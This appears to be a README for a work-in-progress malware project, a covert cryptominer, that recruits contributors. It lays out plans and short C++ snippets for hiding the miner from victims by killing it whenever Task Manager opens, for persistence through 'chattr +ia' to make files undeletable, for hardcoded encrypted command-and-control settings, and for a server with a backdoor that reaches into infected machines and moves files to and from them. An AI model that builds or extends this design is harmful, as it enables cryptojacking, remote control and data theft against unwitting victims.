# CryptoMining  (WORK IN PROGRESS)

This program isn't ready, I'm developing it everyday. 

# Contributing

Feel free to join the development of this cryptominer with code or ideas.

Help is welcome!

I've created a trello to keep the progress, what have been done, and what else is there to do. 

https://trello.com/b/EYUmIGy3/cryptominer

# Ideias

Premisses:
* Multiple Miners 
* less third-parties libraries possible 
* Cryptography to secure client-server communication 
* create hidden/secure directory to store settings and info about the mining process
* Process hiding and obfuscation / Persistence 


# Client side

**cgminer** pool name 

Hardcoded encrypted :server, port and mining pool info 

The server has to aknowledge new miners.  

check if task manager is open 

Infected victim should not know or find about the cryptominer

```c++
global bool lock_taskmanager = false; 
while(!lock_taskmanager){
     Check_task_manager();
}
continue_mining(); 
```

Malware + cgminer 

One process is responsible for server communication and checking task manager, while the child process will only mine.

If the task manager is opened, the child process is killed. When closed, child will be respawned.

**file persistence and undeleted files**

``` c++
    if(root){
        system("sudo chattr +ia file");
    }
```

# Server side

Multithreaded c++ server from scratch, will accept new miners. get info from miners, and will have direct access to the victim machine from a backdoor.

Also will be capable of sending files and downloading files from the infected machine. 

Every new miner will have an directory, containing info about the mining time, logs, Keys used to secure communication(cryptography), etc.


# C++ curl

    sudo apt-get install libcurl4-openssl-dev